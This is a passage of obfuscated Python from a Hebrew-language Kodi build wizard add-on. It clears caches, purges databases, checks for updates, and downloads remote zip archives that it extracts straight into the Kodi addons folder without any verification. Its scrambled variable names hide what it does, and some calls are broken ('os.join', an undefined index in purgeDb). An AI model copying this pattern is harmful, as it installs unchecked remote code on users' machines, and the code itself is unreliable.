			else :O0O0OO00000O000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5467
			if O0O0OO00000O000O0 ==1 :wiz .reloadFix ('fresh')#line:5468
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5469
	else :#line:5470
		if not install =='restore':#line:5471
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5472
			wiz .refresh ()#line:5473
def clearCache ():#line:5478
		wiz .clearCache ()#line:5479
def fixwizard ():#line:5483
		wiz .fixwizard ()#line:5484
def totalClean ():#line:5486
		wiz .clearCache ()#line:5488
		wiz .clearPackages ('total')#line:5489
		clearThumb ('total')#line:5490
		cleanfornewbuild ()#line:5491
def cleanfornewbuild ():#line:5492
		try :#line:5493
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5494
		except :#line:5495
			pass #line:5496
		try :#line:5497
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5498
		except :#line:5499
			pass #line:5500
		try :#line:5501
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5502
		except :#line:5503
			pass #line:5504
def clearThumb (type =None ):#line:5505
	O0000000OOO0OO0O0 =wiz .latestDB ('Textures')#line:5506
	if not type ==None :O0O0OOO0O0O00O00O =1 #line:5507
	else :O0O0OOO0O0O00O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0000000OOO0OO0O0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5508
	if O0O0OOO0O0O00O00O ==1 :#line:5509
		try :wiz .removeFile (os .join (DATABASE ,O0000000OOO0OO0O0 ))#line:5510
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0000000OOO0OO0O0 )#line:5511
		wiz .removeFolder (THUMBS )#line:5512
	else :wiz .log ('Clear thumbnames cancelled')#line:5514
	wiz .redoThumbs ()#line:5515
def purgeDb ():#line:5517
	OO00000O0OO0OO0OO =[];O0OO0OO0OOOOO00O0 =[]#line:5518
	for OOO0OOOO0000OO00O ,OO0OO0OOOO00O00O0 ,OOOOO00O00000O000 in os .walk (HOME ):#line:5519
		for OO0O000O000O0OO00 in fnmatch .filter (OOOOO00O00000O000 ,'*.db'):#line:5520
			if OO0O000O000O0OO00 !='Thumbs.db':#line:5521
				O000OO00O000OO000 =os .path .join (OOO0OOOO0000OO00O ,OO0O000O000O0OO00 )#line:5522
				OO00000O0OO0OO0OO .append (O000OO00O000OO000 )#line:5523
				OOO0OO000O0O0O0O0 =O000OO00O000OO000 .replace ('\\','/').split ('/')#line:5524
				O0OO0OO0OOOOO00O0 .append ('(%s) %s'%(OOO0OO000O0O0O0O0 [len (OOO0OO000O0O0O0O0 )-2 ],OOO0OO000O0O0O0O0 [len (OOO0OO000O0O0O0O0 )-1 ]))#line:5525
	if KODIV >=16 :#line:5526
		O0O0000O00O000O00 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0OO0OOOOO00O0 )#line:5527
		if O0O0000O00O000O00 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5528
		elif len (O0O0000O00O000O00 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5529
		else :#line:5530
			for OO000OOOOOOOO0O00 in O0O0000O00O000O00 :wiz .purgeDb (OO00000O0OO0OO0OO [OO000OOOOOOOO0O00 ])#line:5531
	else :#line:5532
		O0O0000O00O000O00 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0OO0OOOOO00O0 )#line:5533
		if O0O0000O00O000O00 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5534
		else :wiz .purgeDb (OO00000O0OO0OO0OO [OO000OOOOOOOO0O00 ])#line:5535
def fastupdatefirstbuild (OOO00OOO00O0OOOOO ):#line:5541
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5543
	if ENABLE =='Yes':#line:5544
		if not NOTIFY =='true':#line:5545
			OO00OO000OOO0O0OO =wiz .workingURL (NOTIFICATION )#line:5546
			if OO00OO000OOO0O0OO ==True :#line:5547
				O0O00OO0OOO000000 ,OOO0O00O00O0OO0OO =wiz .splitNotify (NOTIFICATION )#line:5548
				if not O0O00OO0OOO000000 ==False :#line:5550
					try :#line:5551
						O0O00OO0OOO000000 =int (O0O00OO0OOO000000 );OOO00OOO00O0OOOOO =int (OOO00OOO00O0OOOOO )#line:5552
						checkidupdate ()#line:5553
						wiz .setS ("notedismiss","true")#line:5554
						if O0O00OO0OOO000000 ==OOO00OOO00O0OOOOO :#line:5555
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0O00OO0OOO000000 ),xbmc .LOGNOTICE )#line:5556
						elif O0O00OO0OOO000000 >OOO00OOO00O0OOOOO :#line:5558
							wiz .log ("[Notifications] id: %s"%str (O0O00OO0OOO000000 ),xbmc .LOGNOTICE )#line:5559
							wiz .setS ('noteid',str (O0O00OO0OOO000000 ))#line:5560
							wiz .setS ("notedismiss","true")#line:5561
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5564
					except Exception as OO00000OO000OO0O0 :#line:5565
						wiz .log ("Error on Notifications Window: %s"%str (OO00000OO000OO0O0 ),xbmc .LOGERROR )#line:5566
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5568
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO00OO000OOO0O0OO ),xbmc .LOGNOTICE )#line:5569
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5570
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5571
def checkUpdate ():#line:5573
	O0000O0O0OOOOO0OO =wiz .getS ('disableupdate')#line:5574
	O00O00OO0OOO000O0 =wiz .getS ('buildname')#line:5575
	O0OO0O0OO000OO0O0 =wiz .getS ('buildversion')#line:5576
	OOOO0O0000OOOOOOO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5577
	OO000O0OOOO00000O =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O00O00OO0OOO000O0 ).findall (OOOO0O0000OOOOOOO )#line:5578
	if len (OO000O0OOOO00000O )>0 :#line:5579
		O00O0OOOO000OO0O0 =OO000O0OOOO00000O [0 ][0 ]#line:5580
		O000000OOO00OOO00 =OO000O0OOOO00000O [0 ][1 ]#line:5581
		O0000OO0O000OO0O0 =OO000O0OOOO00000O [0 ][2 ]#line:5582
		wiz .setS ('latestversion',O00O0OOOO000OO0O0 )#line:5583
		if O00O0OOOO000OO0O0 >O0OO0O0OO000OO0O0 :#line:5584
			if O0000O0O0OOOOO0OO =='false':#line:5585
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O0OO0O0OO000OO0O0 ,O00O0OOOO000OO0O0 ),xbmc .LOGNOTICE )#line:5586
				notify .updateWindow (O00O00OO0OOO000O0 ,O0OO0O0OO000OO0O0 ,O00O0OOOO000OO0O0 ,O000000OOO00OOO00 ,O0000OO0O000OO0O0 )#line:5587
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O0OO0O0OO000OO0O0 ,O00O0OOOO000OO0O0 ),xbmc .LOGNOTICE )#line:5588
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O0OO0O0OO000OO0O0 ,O00O0OOOO000OO0O0 ),xbmc .LOGNOTICE )#line:5589
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5590
def updatetelemedia (O000OO0O0OOO0O00O ):#line:5591
    from startup import teleupdate #line:5592
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5593
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5594
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5595
    wiz .wizardUpdate ('startup')#line:5596
    checkUpdate ()#line:5598
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5599
    time .sleep (15.0 )#line:5600
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5601
     if teleupdate is False :#line:5602
        STARTP2 ()#line:5604
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5605
        if not NOTIFY =='true':#line:5606
            O00O0OOOO0000OO00 =wiz .workingURL (NOTIFICATION )#line:5607
            if O00O0OOOO0000OO00 ==True :#line:5608
                O00OOO000OO0O0OOO ,O00OO0O000OO0O00O =wiz .splitNotify (NOTIFICATION )#line:5609
                if not O00OOO000OO0O0OOO ==False :#line:5610
                    try :#line:5611
                        O00OOO000OO0O0OOO =int (O00OOO000OO0O0OOO );O000OO0O0OOO0O00O =int (O000OO0O0OOO0O00O )#line:5612
                        if O00OOO000OO0O0OOO ==O000OO0O0OOO0O00O :#line:5613
                            if NOTEDISMISS =='false':#line:5614
                                debridit .debridIt ('update','all')#line:5615
                                traktit .traktIt ('update','all')#line:5616
                                checkidupdatetele ()#line:5617
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (O00OOO000OO0O0OOO ),xbmc .LOGNOTICE )#line:5618
                        elif O00OOO000OO0O0OOO >O000OO0O0OOO0O00O :#line:5619
                            wiz .log ("[Notifications] id: %s"%str (O00OOO000OO0O0OOO ),xbmc .LOGNOTICE )#line:5620
                            wiz .setS ('noteid',str (O00OOO000OO0O0OOO ))#line:5621
                            wiz .setS ('notedismiss','false')#line:5622
                            debridit .debridIt ('update','all')#line:5624
                            traktit .traktIt ('update','all')#line:5625
                            checkidupdatetele ()#line:5626
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5628
                    except Exception as O0O0O00000OO0OO00 :#line:5629
                        wiz .log ("Error on Notifications Window: %s"%str (O0O0O00000OO0OO00 ),xbmc .LOGERROR )#line:5630
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5631
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00O0OOOO0000OO00 ),xbmc .LOGNOTICE )#line:5632
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5633
def checkidupdate ():#line:5637
				wiz .setS ("notedismiss","true")#line:5639
				O0000O00000O0OO0O =wiz .workingURL (NOTIFICATION )#line:5640
				O00O0O00O00O000O0 =" Kodi Premium"#line:5642
				O0000OOOO00OOO00O =wiz .checkBuild (O00O0O00O00O000O0 ,'gui')#line:5643
				O000OO0OO0OO0O0OO =O00O0O00O00O000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5644
				if not wiz .workingURL (O0000OOOO00OOO00O )==True :return #line:5645
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5646
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00O0O00O00O000O0 ),'','אנא המתן')#line:5647
				OOOOO0O00OOOOO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000OO0OO0OO0O0OO )#line:5648
				try :os .remove (OOOOO0O00OOOOO00O )#line:5649
				except :pass #line:5650
				logging .warning (O0000OOOO00OOO00O )#line:5651
				if 'google'in O0000OOOO00OOO00O :#line:5652
				   O00O0OOOO0O0OO0OO =googledrive_download (O0000OOOO00OOO00O ,OOOOO0O00OOOOO00O ,DP ,wiz .checkBuild (O00O0O00O00O000O0 ,'filesize'))#line:5653
				else :#line:5656
				  downloader .download (O0000OOOO00OOO00O ,OOOOO0O00OOOOO00O ,DP )#line:5657
				xbmc .sleep (100 )#line:5658
				OO0OO00O00OOO0O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0O00O00O000O0 )#line:5659
				DP .update (0 ,OO0OO00O00OOO0O0O ,'','אנא המתן')#line:5660
				extract .all (OOOOO0O00OOOOO00O ,HOME ,DP ,title =OO0OO00O00OOO0O0O )#line:5661
				DP .close ()#line:5662
				wiz .defaultSkin ()#line:5663
				wiz .lookandFeelData ('save')#line:5664
				if KODIV >=18 :#line:5665
					skindialogsettind18 ()#line:5666
				if INSTALLMETHOD ==1 :OO000OOO0000O000O =1 #line:5669
				elif INSTALLMETHOD ==2 :OO000OOO0000O000O =0 #line:5670
				else :DP .close ()#line:5671
def checkidupdatetele ():#line:5672
				wiz .setS ("notedismiss","true")#line:5674
				OOO0O0O000000OO0O =wiz .workingURL (NOTIFICATION )#line:5675
				OOOOOOOO0OO000OO0 =" Kodi Premium"#line:5677
				OOO0OO00OOOOO0000 =wiz .checkBuild (OOOOOOOO0OO000OO0 ,'gui')#line:5678
				OO0O0OOO00O0OOOO0 =OOOOOOOO0OO000OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5679
				if not wiz .workingURL (OOO0OO00OOOOO0000 )==True :return #line:5680
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5681
				O0OO0O0OO0000000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0OOO00O0OOOO0 )#line:5684
				try :os .remove (O0OO0O0OO0000000O )#line:5685
				except :pass #line:5686
				if 'google'in OOO0OO00OOOOO0000 :#line:5688
				   O0OO0O000OOOOO000 =googledrive_download (OOO0OO00OOOOO0000 ,O0OO0O0OO0000000O ,DP2 ,wiz .checkBuild (OOOOOOOO0OO000OO0 ,'filesize'))#line:5689
				else :#line:5692
				  downloaderbg .download3 (OOO0OO00OOOOO0000 ,O0OO0O0OO0000000O ,DP2 )#line:5693
				xbmc .sleep (100 )#line:5694
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5695
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5697
				extract .all2 (O0OO0O0OO0000000O ,HOME ,DP2 )#line:5699
				DP2 .close ()#line:5700
				wiz .defaultSkin ()#line:5701
				wiz .lookandFeelData ('save')#line:5702
				wiz .kodi17Fix ()#line:5703
				if KODIV >=18 :#line:5704
					skindialogsettind18 ()#line:5705
				debridit .debridIt ('restore','all')#line:5710
				traktit .traktIt ('restore','all')#line:5711
				if INSTALLMETHOD ==1 :OO0O000O0OO0OOOO0 =1 #line:5712
				elif INSTALLMETHOD ==2 :OO0O000O0OO0OOOO0 =0 #line:5713
				else :DP2 .close ()#line:5714
				O0O000OO000O0O00O =(NOTIFICATION2 )#line:5715
				O0O00000O0O00O000 =urllib2 .urlopen (O0O000OO000O0O00O )#line:5716
				O0OOOO000000O000O =O0O00000O0O00O000 .readlines ()#line:5717
				O0O000OOOO00O0O0O =0 #line:5718
				for O0O00OO00O0O0000O in O0OOOO000000O000O :#line:5721
					if O0O00OO00O0O0000O .split (' ==')[0 ]=="noreset"or O0O00OO00O0O0000O .split ()[0 ]=="noreset":#line:5722
						xbmc .executebuiltin ("ReloadSkin()")#line:5724
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5725
						O00OO0000OOO0000O =(ADDON .getSetting ("message"))#line:5726
						if O00OO0000OOO0000O =='true':#line:5727
							infobuild ()#line:5728
						update_Votes ()#line:5729
						indicatorfastupdate ()#line:5730
					if O0O00OO00O0O0000O .split (' ==')[0 ]=="reset"or O0O00OO00O0O0000O .split ()[0 ]=="reset":#line:5731
						update_Votes ()#line:5733
						indicatorfastupdate ()#line:5734
						resetkodi ()#line:5735
def gaiaserenaddon ():#line:5736
  OOO0OO0000OO0O0OO =(ADDON .getSetting ("gaiaseren"))#line:5737
  O0OOO000OOO0OO000 =(ADDON .getSetting ("auto_rd"))#line:5738
  if OOO0OO0000OO0O0OO =='true'and O0OOO000OOO0OO000 =='true':#line:5739
    OO0OO0O0000O0O0O0 =(NEWFASTUPDATE )#line:5740
    O00OO0000O000000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5741
    OO000OOO00000OOOO =xbmcgui .DialogProgress ()#line:5742
    OO000OOO00000OOOO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5743
    O00O00OO0OOO00O00 =os .path .join (PACKAGES ,'isr.zip')#line:5744
    OO0OO0OO0O0000O0O =urllib2 .Request (OO0OO0O0000O0O0O0 )#line:5745
    O0000OOOO0O00O0OO =urllib2 .urlopen (OO0OO0OO0O0000O0O )#line:5746
    O0O0OO000O0O0OOO0 =xbmcgui .DialogProgress ()#line:5748
    O0O0OO000O0O0OOO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5749
    O0O0OO000O0O0OOO0 .update (0 )#line:5750
    O0O0OOO0OO0OOO00O =open (O00O00OO0OOO00O00 ,'wb')#line:5752
    try :#line:5754
      O000000O0O0000OO0 =O0000OOOO0O00O0OO .info ().getheader ('Content-Length').strip ()#line:5755
      O00O0O0000O000O00 =True #line:5756
    except AttributeError :#line:5757
          O00O0O0000O000O00 =False #line:5758
    if O00O0O0000O000O00 :#line:5760
          O000000O0O0000OO0 =int (O000000O0O0000OO0 )#line:5761
    OO0OO0OOO0OO0O0O0 =0 #line:5763
    O00OOO0OOO000OO00 =time .time ()#line:5764
    while True :#line:5765
          OO00OO0OOO00O0O00 =O0000OOOO0O00O0OO .read (8192 )#line:5766
          if not OO00OO0OOO00O0O00 :#line:5767
              sys .stdout .write ('\n')#line:5768
              break #line:5769
          OO0OO0OOO0OO0O0O0 +=len (OO00OO0OOO00O0O00 )#line:5771
          O0O0OOO0OO0OOO00O .write (OO00OO0OOO00O0O00 )#line:5772
          if not O00O0O0000O000O00 :#line:5774
              O000000O0O0000OO0 =OO0OO0OOO0OO0O0O0 #line:5775
          if O0O0OO000O0O0OOO0 .iscanceled ():#line:5776
             O0O0OO000O0O0OOO0 .close ()#line:5777
             try :#line:5778
              os .remove (O00O00OO0OOO00O00 )#line:5779
             except :#line:5780
              pass #line:5781
             break #line:5782
          OO000OO0O00O0O00O =float (OO0OO0OOO0OO0O0O0 )/O000000O0O0000OO0 #line:5783
          OO000OO0O00O0O00O =round (OO000OO0O00O0O00O *100 ,2 )#line:5784
          O0OOO0000000OOO00 =OO0OO0OOO0OO0O0O0 /(1024 *1024 )#line:5785
          O00000OO0O0O00OOO =O000000O0O0000OO0 /(1024 *1024 )#line:5786
          O00OOOOO000OO0O00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO0000000OOO00 ,'teal',O00000OO0O0O00OOO )#line:5787
          if (time .time ()-O00OOO0OOO000OO00 )>0 :#line:5788
            O00OO0000O00O0OO0 =OO0OO0OOO0OO0O0O0 /(time .time ()-O00OOO0OOO000OO00 )#line:5789
            O00OO0000O00O0OO0 =O00OO0000O00O0OO0 /1024 #line:5790
          else :#line:5791
           O00OO0000O00O0OO0 =0 #line:5792
          OOOOOO0O00OOOOOOO ='KB'#line:5793
          if O00OO0000O00O0OO0 >=1024 :#line:5794
             O00OO0000O00O0OO0 =O00OO0000O00O0OO0 /1024 #line:5795
             OOOOOO0O00OOOOOOO ='MB'#line:5796
          if O00OO0000O00O0OO0 >0 and not OO000OO0O00O0O00O ==100 :#line:5797
              O00OOO000OOOOOOOO =(O000000O0O0000OO0 -OO0OO0OOO0OO0O0O0 )/O00OO0000O00O0OO0 #line:5798
          else :#line:5799
              O00OOO000OOOOOOOO =0 #line:5800
          OO000000O0OO00O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO0000O00O0OO0 ,OOOOOO0O00OOOOOOO )#line:5801
          O0O0OO000O0O0OOO0 .update (int (OO000OO0O00O0O00O ),O00OOOOO000OO0O00 ,OO000000O0OO00O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5803
    OO0O0O000O0OO0OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5806
    O0O0OOO0OO0OOO00O .close ()#line:5809
    extract .all (O00O00OO0OOO00O00 ,OO0O0O000O0OO0OOO ,O0O0OO000O0O0OOO0 )#line:5810
    try :#line:5814
      os .remove (O00O00OO0OOO00O00 )#line:5815
    except :#line:5816
      pass #line:5817
def iptvsimpldownpc ():#line:5818
    OO0O0000O0OOOO000 =(IPTVSIMPL18PC )#line:5820
    OOOO0O00OOOO00OOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5821
    O0OO0OOO0O0O0OOO0 =xbmcgui .DialogProgress ()#line:5822
    O0OO0OOO0O0O0OOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5823
    OOOOO000OO0O0OO0O =os .path .join (PACKAGES ,'isr.zip')#line:5824
    O0OO0OO0000OO00O0 =urllib2 .Request (OO0O0000O0OOOO000 )#line:5825
    OOO000O00OOOO00O0 =urllib2 .urlopen (O0OO0OO0000OO00O0 )#line:5826
    O00O000OO0OOO0O00 =xbmcgui .DialogProgress ()#line:5828
    O00O000OO0OOO0O00 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5829
    O00O000OO0OOO0O00 .update (0 )#line:5830
    O000O0OO0O0O0O00O =open (OOOOO000OO0O0OO0O ,'wb')#line:5832
    try :#line:5834
      O0O0OOO00OOO00O00 =OOO000O00OOOO00O0 .info ().getheader ('Content-Length').strip ()#line:5835
      OOO00000OO00OO00O =True #line:5836
    except AttributeError :#line:5837
          OOO00000OO00OO00O =False #line:5838
    if OOO00000OO00OO00O :#line:5840
          O0O0OOO00OOO00O00 =int (O0O0OOO00OOO00O00 )#line:5841
    O00OO000000000O00 =0 #line:5843
    OO000O000O0OOOO0O =time .time ()#line:5844
    while True :#line:5845
          O0OOOOOO0O000OO0O =OOO000O00OOOO00O0 .read (8192 )#line:5846
          if not O0OOOOOO0O000OO0O :#line:5847
              sys .stdout .write ('\n')#line:5848
              break #line:5849
          O00OO000000000O00 +=len (O0OOOOOO0O000OO0O )#line:5851
          O000O0OO0O0O0O00O .write (O0OOOOOO0O000OO0O )#line:5852
          if not OOO00000OO00OO00O :#line:5854
              O0O0OOO00OOO00O00 =O00OO000000000O00 #line:5855
          if O00O000OO0OOO0O00 .iscanceled ():#line:5856
             O00O000OO0OOO0O00 .close ()#line:5857
             try :#line:5858
              os .remove (OOOOO000OO0O0OO0O )#line:5859
             except :#line:5860
              pass #line:5861
             break #line:5862
          OO0O000O0O000OO00 =float (O00OO000000000O00 )/O0O0OOO00OOO00O00 #line:5863
          OO0O000O0O000OO00 =round (OO0O000O0O000OO00 *100 ,2 )#line:5864
          OO0OO0OOO000OO000 =O00OO000000000O00 /(1024 *1024 )#line:5865
          OOOOOO00O000O000O =O0O0OOO00OOO00O00 /(1024 *1024 )#line:5866
          O0O0O0O0O00OOO0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO0OOO000OO000 ,'teal',OOOOOO00O000O000O )#line:5867
          if (time .time ()-OO000O000O0OOOO0O )>0 :#line:5868
            O0O00O000O0000000 =O00OO000000000O00 /(time .time ()-OO000O000O0OOOO0O )#line:5869
            O0O00O000O0000000 =O0O00O000O0000000 /1024 #line:5870
          else :#line:5871
           O0O00O000O0000000 =0 #line:5872
          OO0O00O0OO0OOOO0O ='KB'#line:5873
          if O0O00O000O0000000 >=1024 :#line:5874
             O0O00O000O0000000 =O0O00O000O0000000 /1024 #line:5875
             OO0O00O0OO0OOOO0O ='MB'#line:5876
          if O0O00O000O0000000 >0 and not OO0O000O0O000OO00 ==100 :#line:5877
              OO0000O00OO00O00O =(O0O0OOO00OOO00O00 -O00OO000000000O00 )/O0O00O000O0000000 #line:5878
          else :#line:5879
              OO0000O00OO00O00O =0 #line:5880
          OOO0OO0OOO0OO0OOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O00O000O0000000 ,OO0O00O0OO0OOOO0O )#line:5881
          O00O000OO0OOO0O00 .update (int (OO0O000O0O000OO00 ),O0O0O0O0O00OOO0OO ,OOO0OO0OOO0OO0OOO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5883
    O0OOO00OO0OO00OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5886
    O000O0OO0O0O0O00O .close ()#line:5889
    extract .all (OOOOO000OO0O0OO0O ,O0OOO00OO0OO00OOO ,O00O000OO0OOO0O00 )#line:5890
    try :#line:5894
      os .remove (OOOOO000OO0O0OO0O )#line:5895
    except :#line:5896
      pass #line:5897
def iptvkodi18idan ():#line:5898
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5900
              OO0OO00000OO0OO0O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5903
              O0O00O0OO0O0000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5904
              OOOOO0O00OO0O000O =xbmcgui .DialogProgress ()#line:5905
              OOOOO0O00OO0O000O .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5906
              O0OO0OOOOO00O0OOO =os .path .join (O0O00O0OO0O0000OO ,'isr.zip')#line:5907
              O0OOO0OOO0OOO00O0 =urllib2 .Request (OO0OO00000OO0OO0O )#line:5908
              OOO00OO000O00OO0O =urllib2 .urlopen (O0OOO0OOO0OOO00O0 )#line:5909
              OOOO0O00000OOOO0O =xbmcgui .DialogProgress ()#line:5911
              OOOO0O00000OOOO0O .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5912
              OOOO0O00000OOOO0O .update (0 )#line:5913
              OO00O0OOO0000O0OO =open (O0OO0OOOOO00O0OOO ,'wb')#line:5915
              try :#line:5917
                O0O0000O0000O0OO0 =OOO00OO000O00OO0O .info ().getheader ('Content-Length').strip ()#line:5918
                OOO00000O0000O000 =True #line:5919
              except AttributeError :#line:5920
                    OOO00000O0000O000 =False #line:5921
              if OOO00000O0000O000 :#line:5923
                    O0O0000O0000O0OO0 =int (O0O0000O0000O0OO0 )#line:5924
              O0O000O000OOO0000 =0 #line:5926
              OOO0O00OOOOO000OO =time .time ()#line:5927
              while True :#line:5928
                    OOO00OOOOO0OOO00O =OOO00OO000O00OO0O .read (8192 )#line:5929
                    if not OOO00OOOOO0OOO00O :#line:5930
                        sys .stdout .write ('\n')#line:5931
                        break #line:5932
                    O0O000O000OOO0000 +=len (OOO00OOOOO0OOO00O )#line:5934
                    OO00O0OOO0000O0OO .write (OOO00OOOOO0OOO00O )#line:5935
                    if not OOO00000O0000O000 :#line:5937
                        O0O0000O0000O0OO0 =O0O000O000OOO0000 #line:5938
                    if OOOO0O00000OOOO0O .iscanceled ():#line:5939
                       OOOO0O00000OOOO0O .close ()#line:5940
                       try :#line:5941
                        os .remove (O0OO0OOOOO00O0OOO )#line:5942
                       except :#line:5943
                        pass #line:5944
                       break #line:5945
                    O000OOOOO00O0O0OO =float (O0O000O000OOO0000 )/O0O0000O0000O0OO0 #line:5946
                    O000OOOOO00O0O0OO =round (O000OOOOO00O0O0OO *100 ,2 )#line:5947
                    O000O000OOOOOOO00 =O0O000O000OOO0000 /(1024 *1024 )#line:5948
                    OOOOO0O0O00OOOOOO =O0O0000O0000O0OO0 /(1024 *1024 )#line:5949
                    O000O000OOOO0O000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000O000OOOOOOO00 ,'teal',OOOOO0O0O00OOOOOO )#line:5950
                    if (time .time ()-OOO0O00OOOOO000OO )>0 :#line:5951
